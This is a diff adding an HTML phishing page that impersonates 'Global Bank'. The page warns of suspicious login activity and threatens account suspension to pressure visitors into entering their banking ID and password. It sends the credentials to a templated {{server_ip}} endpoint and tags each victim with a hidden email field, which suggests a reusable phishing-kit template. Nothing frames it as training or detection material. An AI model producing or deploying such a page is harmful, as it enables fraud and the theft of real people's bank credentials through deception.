@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Verification Required</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f6f6f6; }
+        .alert-box { 
+            background: white; width: 600px; margin: 50px auto;
+            padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .logo { height: 40px; margin-bottom: 20px; }
+        .alert-header { color: #c00; font-size: 24px; margin: 15px 0; }
+        .content { line-height: 1.6; color: #444; }
+        .verify-button { 
+            background: #c00; color: white; padding: 12px 25px;
+            border: none; border-radius: 4px; cursor: pointer; margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="alert-box">
+        <img src="https://example.com/bank-logo.png" class="logo" alt="Global Bank">
+        <div class="alert-header">Suspicious Activity Detected</div>
+        <div class="content">
+            <p>Dear User,</p>
+            <p>We detected unusual login activity from a new device. Verify your identity immediately to secure your account.</p>
+            <form method="POST" action="{{server_ip}}/submit">
+                <input type="hidden" name="email" value="{{email}}">
+                <input type="text" name="username" placeholder="Online Banking ID" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" class="verify-button">Verify Now</button>
+            </form>
+            <p style="font-size: 0.9em; color: #666;">
+                Failure to verify may result in account suspension.
+            </p>
+        </div>
+    </div>
+</body>
+</html>
